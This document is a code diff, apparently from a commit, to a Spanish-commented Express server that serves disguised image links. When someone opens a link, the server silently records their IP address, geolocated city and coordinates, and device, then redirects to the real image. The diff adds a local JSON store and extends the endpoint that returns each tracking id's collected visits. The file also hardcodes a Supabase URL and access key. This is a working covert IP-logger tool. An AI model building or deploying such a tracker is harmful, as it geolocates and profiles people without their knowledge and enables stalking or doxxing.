@@ -11,7 +11,7 @@ app.use(express.json());
 app.use(express.static('.'));
 
 // ============================================================
-//  🔥 CONFIGURACIÓN DE SUPABASE
+//  CONFIGURACIÓN DE SUPABASE
 // ============================================================
 const SUPABASE_URL = 'https://cjfwowcbuuozeefmdqln.supabase.co';
 const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImNqZndvd2NidXVvemVlZm1kcWxuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODI4OTcxNzMsImV4cCI6MjA5ODQ3MzE3M30.zWNTmg6rZCFpjwrY99RvzgGmtAvVZAM9_5X_ss4OszA';
@@ -64,13 +64,12 @@ app.get('/i/:rid/:nombreImagen', async (req, res) => {
     const { rid, nombreImagen } = req.params;
     const { device } = req.query;
 
-    console.log(`📥 Petición recibida: /i/${rid}/${nombreImagen.substring(0, 30)}...`);
+    console.log(`📥 Petición recibida: rid=${rid}`);
 
     // Decodificar la imagen
     let imgUrl;
     try {
         imgUrl = Buffer.from(nombreImagen.split('.')[0], 'base64').toString('utf-8');
-        console.log(`🖼️ Imagen decodificada: ${imgUrl.substring(0, 50)}...`);
     } catch (e) {
         console.error('❌ Error decodificando imagen:', e);
         return res.status(400).send('Imagen no válida');
@@ -94,37 +93,66 @@ app.get('/i/:rid/:nombreImagen', async (req, res) => {
         const date = new Date().toISOString().replace('T', ' ').slice(0, 19);
         const geo = await getGeoLocation(ip);
 
-        console.log(`📝 Registrando visita: RID=${rid}, IP=${ip}, País=${geo.pais}, Ciudad=${geo.ciudad}`);
+        console.log(`📝 Intentando guardar: RID=${rid}, IP=${ip}, País=${geo.pais}`);
 
-        // Guardar en Supabase
-        const { error } = await supabase
+        // ============================================================
+        //  INTENTAR GUARDAR EN SUPABASE CON VERIFICACIÓN
+        // ============================================================
+        const { data, error } = await supabase
             .from('registros')
             .insert([
                 {
                     rid: rid,
                     ip: ip,
                     fecha: date,
-                    pais: geo.pais,
-                    region: geo.region,
-                    ciudad: geo.ciudad,
-                    coordenadas: `${geo.lat}, ${geo.lon}`,
+                    pais: geo.pais || 'Desconocido',
+                    region: geo.region || 'Desconocido',
+                    ciudad: geo.ciudad || 'Desconocido',
+                    coordenadas: `${geo.lat || 0}, ${geo.lon || 0}`,
                     dispositivo: deviceInfo.tipo || userAgent,
                     imagen: imgUrl
                 }
             ]);
 
         if (error) {
-            console.error('❌ Error guardando en Supabase:', error);
-            // No fallar la redirección por un error de guardado
+            console.error('❌ Error en Supabase:', error);
+            console.error('❌ Detalles del error:', error.message);
+            // No devolvemos error al usuario, solo registramos
         } else {
-            console.log(`✅ Visita registrada correctamente para RID: ${rid}`);
+            console.log(`✅ Visita registrada en Supabase: ${data}`);
         }
+
+        // ============================================================
+        //  GUARDAR TAMBIÉN EN ARCHIVO LOCAL (FALLBACK)
+        // ============================================================
+        try {
+            const dbFile = 'database.json';
+            let db = {};
+            if (fs.existsSync(dbFile)) {
+                db = JSON.parse(fs.readFileSync(dbFile, 'utf8'));
+            }
+            if (!db[rid]) db[rid] = [];
+            db[rid].push({
+                ip: ip,
+                date: date,
+                pais: geo.pais || 'Desconocido',
+                region: geo.region || 'Desconocido',
+                ciudad: geo.ciudad || 'Desconocido',
+                coords: `${geo.lat || 0}, ${geo.lon || 0}`,
+                dispositivo: deviceInfo.tipo || userAgent,
+                imagen: imgUrl
+            });
+            fs.writeFileSync(dbFile, JSON.stringify(db, null, 2));
+            console.log(`💾 Visita guardada en archivo local (fallback)`);
+        } catch (e) {
+            console.error('❌ Error guardando en archivo local:', e);
+        }
+
     } catch (e) {
-        console.error('❌ Error registrando visita:', e);
+        console.error('❌ Error general registrando visita:', e);
     }
 
     // ============ REDIRIGIR A LA IMAGEN ============
-    console.log(`🔄 Redirigiendo a: ${imgUrl}`);
     if (imgUrl.startsWith('http://') || imgUrl.startsWith('https://')) {
         return res.redirect(imgUrl);
     }
@@ -134,7 +162,6 @@ app.get('/i/:rid/:nombreImagen', async (req, res) => {
         return res.sendFile(imagePath);
     }
 
-    // Si no hay imagen, mostrar un placeholder simple
     res.send(`
         <html>
             <body style="background:#1a0a2e;display:flex;justify-content:center;align-items:center;height:100vh;color:#c084fc;font-family:Arial;text-align:center;">
@@ -149,39 +176,68 @@ app.get('/i/:rid/:nombreImagen', async (req, res) => {
 });
 
 // ============================================================
-//  OBTENER REGISTROS
+//  OBTENER REGISTROS - CON FALLBACK A ARCHIVO LOCAL
 // ============================================================
 app.get('/api/records/:rid', async (req, res) => {
     const rid = req.params.rid;
     console.log(`📋 Buscando registros para RID: ${rid}`);
 
+    let records = [];
+
+    // ============================================================
+    //  INTENTAR OBTENER DE SUPABASE
+    // ============================================================
     try {
-        const { data: records, error } = await supabase
+        const { data, error } = await supabase
             .from('registros')
             .select('*')
             .eq('rid', rid)
             .order('fecha', { ascending: false });
 
-        if (error) {
-            console.error('❌ Error obteniendo registros:', error);
-            return res.status(500).json({ error: 'Error al obtener los registros' });
+        if (!error && data && data.length > 0) {
+            records = data;
+            console.log(`✅ ${records.length} registros encontrados en Supabase`);
+        } else if (error) {
+            console.warn('⚠️ Error en Supabase:', error.message);
         }
-
-        if (!records || records.length === 0) {
-            console.log(`📭 No hay registros para RID: ${rid}`);
-            return res.status(404).json({ message: 'Sin registros' });
-        }
-
-        console.log(`✅ ${records.length} registros encontrados para RID: ${rid}`);
-        res.json({
-            rid: rid,
-            count: records.length,
-            records
-        });
     } catch (e) {
-        console.error('❌ Error:', e);
-        res.status(500).json({ error: 'Error interno' });
+        console.warn('⚠️ Error consultando Supabase:', e);
     }
+
+    // ============================================================
+    //  FALLBACK: OBTENER DE ARCHIVO LOCAL
+    // ============================================================
+    if (records.length === 0) {
+        try {
+            const dbFile = 'database.json';
+            if (fs.existsSync(dbFile)) {
+                const db = JSON.parse(fs.readFileSync(dbFile, 'utf8'));
+                if (db[rid]) {
+                    records = db[rid];
+                    console.log(`💾 ${records.length} registros encontrados en archivo local`);
+                }
+            }
+        } catch (e) {
+            console.error('❌ Error leyendo archivo local:', e);
+        }
+    }
+
+    // ============================================================
+    //  SI NO HAY REGISTROS
+    // ============================================================
+    if (!records || records.length === 0) {
+        console.log(`📭 No hay registros para RID: ${rid}`);
+        return res.status(404).json({ message: 'Sin registros' });
+    }
+
+    // ============================================================
+    //  DEVOLVER REGISTROS
+    // ============================================================
+    res.json({
+        rid: rid,
+        count: records.length,
+        records: records
+    });
 });
 
 // ============================================================
@@ -189,7 +245,6 @@ app.get('/api/records/:rid', async (req, res) => {
 // ============================================================
 app.listen(PORT, () => {
     console.log(`✅ Servidor corriendo en puerto ${PORT}`);
-    console.log(`🟣 Visor - v3.0 (Supabase)`);
-    console.log(`📁 Datos guardados en Supabase`);
-    console.log(`🌐 URL del servidor: http://localhost:${PORT}`);
+    console.log(`🟣 Visor - v3.0 (Supabase + Fallback Local)`);
+    console.log(`📁 Datos guardados en Supabase y localmente`);
 });
